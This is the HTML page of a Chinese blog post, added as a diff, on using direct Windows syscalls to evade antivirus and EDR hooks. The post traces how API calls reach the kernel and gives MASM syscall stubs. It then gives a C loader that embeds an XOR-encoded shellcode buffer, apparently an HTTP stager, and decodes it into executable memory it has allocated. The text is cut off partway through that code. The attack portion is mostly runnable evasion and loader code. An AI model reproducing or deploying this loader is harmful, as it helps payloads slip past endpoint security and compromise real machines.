@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Dota_128px_1143945_easyicon.net.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mamor5409.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="使用系统调用Syscall规避杀软Hook-持续完善">
+<meta property="og:url" content="http://mamor5409.github.io/posts/b3138fd/index.html">
+<meta property="og:site_name" content="Mamor&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/b3138fd/1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/b3138fd/2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/b3138fd/3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/b3138fd/4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/b3138fd/5.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/b3138fd/6.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/b3138fd/7.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/b3138fd/8.png">
+<meta property="article:published_time" content="2022-12-11T01:50:24.000Z">
+<meta property="article:modified_time" content="2022-12-11T01:57:03.254Z">
+<meta property="article:author" content="Mamor">
+<meta property="article:tag" content="Bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/b3138fd/1.png">
+
+<link rel="canonical" href="http://mamor5409.github.io/posts/b3138fd/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>使用系统调用Syscall规避杀软Hook-持续完善 | Mamor's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Mamor's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mamor's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/b3138fd/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kabi.jpg">
+      <meta itemprop="name" content="Mamor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mamor's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          使用系统调用Syscall规避杀软Hook-持续完善
+        </h1>
+
+        <div class="post-meta">
+
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-11 09:50:24 / 修改时间：09:57:03" itemprop="dateCreated datePublished" datetime="2022-12-11T09:50:24+08:00">2022-12-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Bypass/" itemprop="url" rel="index"><span itemprop="name">Bypass</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>16k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>15 分钟</span>
+            </span>
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="Syscall"><a href="#Syscall" class="headerlink" title="Syscall"></a>Syscall</h3><p>x86 windows 使用 sysenter 实现系统调用，而x64 windows 使用 <strong>syscall</strong> 实现系统调用。<br>syscall已经成为了绕过AV/EDR所使用的主流方式，可以用它绕过一些敏感函数的调用监控(R3)。主流的AV/EDR都会对敏感函数进行HOOK，而syscall则可以用来绕过该类检测。<br>（可以通过<code>https://j00ru.vexillium.org/syscalls/nt/64/</code>查询各系统64位系统调用号<br> <code>https://j00ru.vexillium.org/syscalls/nt/32/</code> 查询各系统32位系统调用号）</p>
+<h4 id="简单分析WindowsAPI调用过程"><a href="#简单分析WindowsAPI调用过程" class="headerlink" title="简单分析WindowsAPI调用过程"></a>简单分析WindowsAPI调用过程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">Thread</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Thread, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用process monitor 查看该进程调用过程 从CreateThread -&gt; CreateRemoteThreadEx -&gt;NtCreateThreadEx 最后进入内核<br><img src="/posts/b3138fd/1.png"></p>
+<h4 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h4><p>使用IDA查看ntdll.dll<br>简单看下R3函数的底层实现</p>
+<p>NtAllocateVirtualMemoryEx<br><img src="/posts/b3138fd/2.png"></p>
+<p>NtWriteVirtualMemory<br><img src="/posts/b3138fd/3.png"></p>
+<p>NtCreateThreadEx<br><img src="/posts/b3138fd/4.png"><br>这几个函数形式基本上都是一致的 ，只有系统调用号不同。将参数放入eax 的76h 为 ssdt表中的系统调用号中，然后再判断是否是syscall的方式进入内核，如果不支持就使用右边的调用方式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">NtAllocateVirtualMemoryExProc proc</span><br><span class="line">	mov     r10, rcx    </span><br><span class="line">	mov     eax, 76h  ;将系统调用号存入eax  </span><br><span class="line">	syscall           ;进入内核层</span><br><span class="line">	ret</span><br><span class="line">NtAllocateVirtualMemoryExProc endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>将用到的API写到syscall.asm中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.code </span><br><span class="line">NtAllocateVirtualMemoryExProc proc</span><br><span class="line">mov     r10, rcx      </span><br><span class="line">mov     eax, 76h</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">NtAllocateVirtualMemoryExProc endp</span><br><span class="line"></span><br><span class="line">NtWriteVirtualMemoryProc proc</span><br><span class="line">mov     r10, rcx        </span><br><span class="line">mov     eax, 03Ah</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">NtWriteVirtualMemoryProc endp</span><br><span class="line"></span><br><span class="line">NtCreateThreadExProc proc</span><br><span class="line">mov     r10, rcx        </span><br><span class="line">mov     eax, 0C1h</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">NtCreateThreadExProc endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>在该asm下属性中单独设置以下配置:<br>ml64 /c %(fileName).asm<br>%(fileName).obj;<br><img src="/posts/b3138fd/5.png"></p>
+<p><img src="/posts/b3138fd/6.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS NTAPI <span class="title">NtAllocateVirtualMemoryExProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_opt_ HANDLE Process,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_opt_ PVOID* BaseAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ SIZE_T* RegionSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ ULONG AllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ ULONG PageProtection,</span></span></span><br><span class="line"><span class="function"><span class="params">	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ ULONG ParameterCount</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS NTAPI <span class="title">NtWriteVirtualMemoryProc</span><span class="params">(HANDLE ProcessHandle,PVOID BaseAddress,PVOID Buffer,ULONG BufferLength,PULONG ReturnLength OPTIONAL)</span></span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS NTAPI <span class="title">NtCreateThreadExProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID pUnkown</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtAllocateVirtualMemoryEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_opt_ HANDLE Process,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_opt_ PVOID* BaseAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ SIZE_T* RegionSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ ULONG AllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ ULONG PageProtection,</span></span></span><br><span class="line"><span class="function"><span class="params">	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ ULONG ParameterCount)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtWriteVirtualMemory)</span><span class="params">(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferLength, PULONG ReturnLength OPTIONAL)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID pUnkown</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异或后的shellcode</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xbe\x0a\xc1\xa6\xb2\xaa\x8a\x42\x42\x42\x03\x13\x03\x12\x10\x13\x14\x0a\x73\x90\x27\x0a\xc9\x10\x22\x0a\xc9\x10\x5a\x0a\xc9\x10\x62\x0a\xc9\x30\x12\x0a\x4d\xf5\x08\x08\x0f\x73\x8b\x0a\x73\x82\xee\x7e\x23\x3e\x40\x6e\x62\x03\x83\x8b\x4f\x03\x43\x83\xa0\xaf\x10\x03\x13\x0a\xc9\x10\x62\xc9\x00\x7e\x0a\x43\x92\x24\xc3\x3a\x5a\x49\x40\x37\x30\xc9\xc2\xca\x42\x42\x42\x0a\xc7\x82\x36\x25\x0a\x43\x92\x12\xc9\x0a\x5a\x06\xc9\x02\x62\x0b\x43\x92\xa1\x14\x0a\xbd\x8b\x03\xc9\x76\xca\x0a\x43\x94\x0f\x73\x8b\x0a\x73\x82\xee\x03\x83\x8b\x4f\x03\x43\x83\x7a\xa2\x37\xb3\x0e\x41\x0e\x66\x4a\x07\x7b\x93\x37\x9a\x1a\x06\xc9\x02\x66\x0b\x43\x92\x24\x03\xc9\x4e\x0a\x06\xc9\x02\x5e\x0b\x43\x92\x03\xc9\x46\xca\x0a\x43\x92\x03\x1a\x03\x1a\x1c\x1b\x18\x03\x1a\x03\x1b\x03\x18\x0a\xc1\xae\x62\x03\x10\xbd\xa2\x1a\x03\x1b\x18\x0a\xc9\x50\xab\x0d\xbd\xbd\xbd\x1f\x28\x42\x0b\xfc\x35\x2b\x2c\x2b\x2c\x27\x36\x42\x03\x14\x0b\xcb\xa4\x0e\xcb\xb3\x03\xf8\x0e\x35\x64\x45\xbd\x97\x0a\x73\x8b\x0a\x73\x90\x0f\x73\x82\x0f\x73\x8b\x03\x12\x03\x12\x03\xf8\x78\x14\x3b\xe5\xbd\x97\xa9\x31\x18\x0a\xcb\x83\x03\xfa\x6a\x41\x42\x42\x0f\x73\x8b\x03\x13\x03\x13\x28\x41\x03\x13\x03\xf8\x15\xcb\xdd\x84\xbd\x97\xa9\x1b\x19\x0a\xcb\x83\x0a\x73\x90\x0b\xcb\x9a\x0f\x73\x8b\x10\x2a\x42\x40\x02\xc6\x10\x10\x03\xf8\xa9\x17\x6c\x79\xbd\x97\x0a\xcb\x84\x0a\xc1\x81\x12\x28\x48\x1d\x0a\xcb\xb3\x0a\xcb\x98\x0b\x85\x82\xbd\xbd\xbd\xbd\x0f\x73\x8b\x10\x10\x03\xf8\x6f\x44\x5a\x39\xbd\x97\xc7\x82\x4d\xc7\xdf\x43\x42\x42\x0a\xbd\x8d\x4d\xc6\xce\x43\x42\x42\xa9\x91\xab\xa6\x43\x42\x42\xaa\xe0\xbd\xbd\xbd\x6d\x28\x08\x11\x14\x42\x2c\xaf\xcb\x27\xf3\xeb\x79\x89\x97\xe9\x9e\x82\x2b\x92\x89\x37\x1b\x18\x0f\xfb\x7f\x6f\x51\xaf\xd2\xe8\x4e\x3e\x46\xfd\xf9\x48\xbb\x8a\x77\x46\xa2\xae\x4b\x48\x90\xed\xd7\x70\xa0\xea\xe8\xff\x56\xcc\x0f\xa1\x60\xf5\x32\x38\xfc\x5f\xa5\x65\x08\xd6\x8d\x3c\x2e\x6d\xad\x5d\x3f\xa4\xe2\x00\x8a\x42\x17\x31\x27\x30\x6f\x03\x25\x27\x2c\x36\x78\x62\x0f\x2d\x38\x2b\x2e\x2e\x23\x6d\x77\x6c\x72\x62\x6a\x21\x2d\x2f\x32\x23\x36\x2b\x20\x2e\x27\x79\x62\x0f\x11\x0b\x07\x62\x7b\x6c\x72\x79\x62\x15\x2b\x2c\x26\x2d\x35\x31\x62\x0c\x16\x62\x74\x6c\x73\x79\x62\x16\x30\x2b\x26\x27\x2c\x36\x6d\x77\x6c\x72\x6b\x62\x0e\x00\x00\x10\x0d\x15\x11\x07\x10\x4f\x48\x42\x9a\xd8\x83\x80\x12\x4c\x94\x3e\x35\x26\x4a\xb4\x1b\x66\xd3\xf9\xcf\x15\x15\xb4\xef\x52\x8c\x9a\x93\x5d\xad\x04\x25\x97\x2d\xb4\xf4\x6b\xd4\x1e\xd0\x29\xd2\xfa\xfe\x7f\xf3\x29\xa5\x7e\x27\x1b\x09\x81\x60\x12\x17\x47\xf4\xe0\x34\x4c\xd6\x63\x50\xd5\x79\x95\x32\xbe\x75\x69\x28\x15\x36\x6a\xcf\xf8\xbe\x39\x5b\x9e\x23\x43\xce\xc1\x27\x85\x92\x80\x15\x54\x82\x47\x51\x33\x6e\x1a\x06\x6a\x59\xd3\xc5\xf4\xaa\x46\xed\xf7\x03\x57\x17\x93\xab\x39\xb4\xb2\xed\x09\x74\xb1\x25\x22\x32\xbb\xd2\x64\xee\xc9\x94\xb1\x31\x63\x57\x71\xe2\x44\x19\x71\x61\x5a\x72\x3d\xe9\x90\xd1\x7e\x81\x87\xf0\xe4\x8c\xe1\x0f\x57\xc4\xe2\xeb\x7b\x89\x64\x66\x34\x5a\x0b\xba\xc2\x9b\x3e\x4c\xc8\xfd\x8e\x31\xcc\xe9\x63\x04\x4c\x94\x15\xea\x63\xc6\xcd\x4c\xfa\xa1\xa4\x9c\x34\x86\x87\x1f\xe8\x37\x1c\x3e\xf8\xac\xac\xdd\x88\xc2\x73\xa2\x3b\x25\x3b\x81\x77\x18\x04\x8f\x97\xc2\x3b\xdf\x86\x89\x42\x03\xfc\xb2\xf7\xe0\x14\xbd\x97\x0a\x73\x8b\xf8\x42\x42\x02\x42\x03\xfa\x42\x52\x42\x42\x03\xfb\x02\x42\x42\x42\x03\xf8\x1a\xe6\x11\xa7\xbd\x97\x0a\xd1\x11\x11\x0a\xcb\xa5\x0a\xcb\xb3\x0a\xcb\x98\x03\xfa\x42\x62\x42\x42\x0b\xcb\xbb\x03\xf8\x50\xd4\xcb\xa0\xbd\x97\x0a\xc1\x86\x62\xc7\x82\x36\xf4\x24\xc9\x45\x0a\x43\x81\xc7\x82\x37\x95\x1a\x1a\x1a\x0a\x47\x42\x42\x42\x42\x12\x81\xaa\xdd\xbf\xbd\xbd\x73\x7b\x70\x6c\x73\x74\x7a\x6c\x73\x7a\x73\x6c\x73\x71\x70\x42\x78\x9c\x2a\xf3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)&amp;NtAllocateVirtualMemoryExProc;</span><br><span class="line">pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)&amp;NtWriteVirtualMemoryProc;</span><br><span class="line">pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)&amp;NtCreateThreadExProc;</span><br><span class="line">	LPVOID Address = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T uSize = <span class="number">0x1000</span>;</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	NTSTATUS status = NtAllocateVirtualMemoryEx(hProcess, &amp;Address, &amp;uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 还原异或</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">66</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	status = NtWriteVirtualMemory(hProcess, Address, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span 